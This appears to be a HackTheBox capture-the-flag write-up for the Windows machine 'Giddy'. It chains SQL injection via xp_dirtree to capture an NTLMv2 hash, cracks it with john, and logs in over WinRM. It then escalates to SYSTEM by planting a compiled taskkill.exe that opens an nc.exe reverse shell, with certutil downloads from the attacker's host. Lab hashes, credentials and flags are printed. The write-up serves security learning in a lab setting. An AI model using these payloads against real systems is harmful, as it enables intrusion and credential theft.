---
title: "Giddy"
date: 2025-06-10
categories:
  - HackTheBox
  - Windows
tags:
  - HackTheBox
  - Windows
---

# Giddy

![](../assets/Pasted%20image%2020250610211545.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.104
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 21:19 CEST
Nmap scan report for 10.10.10.104
Host is up (0.040s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: 2025-06-10T19:20:24+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-10T19:20:24+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2025-06-10T19:20:19+00:00
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2025-06-09T19:15:47
|_Not valid after:  2025-12-09T19:15:47
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   39.84 ms 10.10.14.1
2   40.07 ms 10.10.10.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds
```

The webserver shows a picture of a dog.

![](../assets/Pasted%20image%2020250610221057.png)

Using `feroxbuster` we find `/remote` and `/mvc`.

![](../assets/Pasted%20image%2020250610222618.png)

![](../assets/Pasted%20image%2020250610222511.png)

In `/mvc` we have a vulnerable SQLi parameter when searching.

![](../assets/Pasted%20image%2020250610222736.png)

There is a second point of injection in `product.aspx`, `productsubcategoryid`.

## Initial Access

We can use `xp_dirtree` to try to get a hash. Start an SMB server and execute the query.

```shell
https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18;%20EXEC%20MASTER.sys.xp_dirtree%20%27\\10.10.14.17\kali\test%27
```

```shell
$ impacket-smbserver -smb2support kali .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.104,49710)
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User GIDDY\Stacy authenticated successfully
[*] Stacy::GIDDY:aaaaaaaaaaaaaaaa:a2460a71e3840477bcdba3394bf65d21:0101000000000000801b394ec4dbdb0109baf7b5a3abbf04000000000100100079006e0049006f004a005200680058000300100079006e0049006f004a005200680058000200100043005700410067007a0062006c0068000400100043005700410067007a0062006c00680007000800801b394ec4dbdb01060004000200000008003000300000000000000000000000003000007c1be546a3f4e42191147ba215b5e89f3f388bf71cc4bc9a355f1bce1c1765ba0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003700000000000000000000000000
```

Using `john`:

```shell
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash  
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)     
1g 0:00:00:01 DONE (2025-06-12 20:10) 0.6250g/s 1680Kp/s 1680Kc/s 1680KC/s xabat..x9831915x
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

`Stacy:xNnWo6272k7x`

Testing credentials with `nxc`:

![](../assets/Pasted%20image%2020250612201356.png)

```shell
$ evil-winrm -i 10.10.10.104 -u stacy -p xNnWo6272k7x

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Stacy\Documents> whoami
giddy\stacy
```

Get the flag:

```shell
*Evil-WinRM* PS C:\Users\Stacy\desktop> type user.txt
5a7edac0ca154dcfa80ec0b5010112ab
```

## Privilege Escalation

The user's document folder has a `unifivideo` file:

```shell
*Evil-WinRM* PS C:\Users\Stacy\documents> ls


    Directory: C:\Users\Stacy\documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
```

Searching with `searchsploit`:

![](../assets/Pasted%20image%2020250612203241.png)

```shell
5. VULNERABILITY DETAILS
========================
Ubiquiti UniFi Video for Windows is installed to "C:\ProgramData\unifi-video\"
by default and is also shipped with a service called "Ubiquiti UniFi Video". Its
executable "avService.exe" is placed in the same directory and also runs under
the NT AUTHORITY/SYSTEM account.

However the default permissions on the "C:\ProgramData\unifi-video" folder are
inherited from "C:\ProgramData" and are not explicitly overridden, which allows
all users, even unprivileged ones, to append and write files to the application
directory:

c:\ProgramData>icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Administrators:(I)(OI)(CI)(F)
CREATOR OWNER:(I)(OI)(CI)(IO)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Upon start and stop of the service, it tries to load and execute the file at
"C:\ProgramData\unifi-video\taskkill.exe". However this file does not exist in
the application directory by default at all.

By copying an arbitrary "taskkill.exe" to "C:\ProgramData\unifi-video\" as an
unprivileged user, it is therefore possible to escalate privileges and execute
arbitrary code as NT AUTHORITY/SYSTEM.
```

So we can create a `taskkill.exe` and put it in the folder, restart the service, and the malicious exe will be executed.

```shell
$ cat taskkill.c                  
#include "stdlib.h"

int main()
{
    system("C:\\programdata\\unifi-video\\nc.exe -e cmd.exe 10.10.14.17 4444");
}
```

```shell
$ x86_64-w64-mingw32-gcc taskkill.c -o taskkill.exe
```

Upload `nc.exe` and `taskkill.exe`:

```shell
*Evil-WinRM* PS C:\programdata\unifi-video> certutil -f -split -urlcache http://10.10.14.17:8000/taskkill.exe
*Evil-WinRM* PS C:\programdata\unifi-video> certutil -f -split -urlcache http://10.10.14.17:8000/nc.exe
```

Start and stop the service and start the listener:

```shell
*Evil-WinRM* PS C:\programdata\unifi-video> stop-service -name "Ubiquiti Unifi Video"
Warning: Waiting for service 'Ubiquiti Unifi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti Unifi Video (UniFiVideoService)' to stop...
Warning: Waiting for service 'Ubiquiti Unifi Video (UniFiVideoService)' to stop...
*Evil-WinRM* PS C:\programdata\unifi-video> start-service -name "Ubiquiti Unifi Video"
```

```shell
$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.104] 49819
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system
```

## Post Exploitation

Get the flag:

```shell
C:\Users\Administrator\Desktop>type root.txt
type root.txt
5c5d6c15aad3a052570839b7d8b45473
```
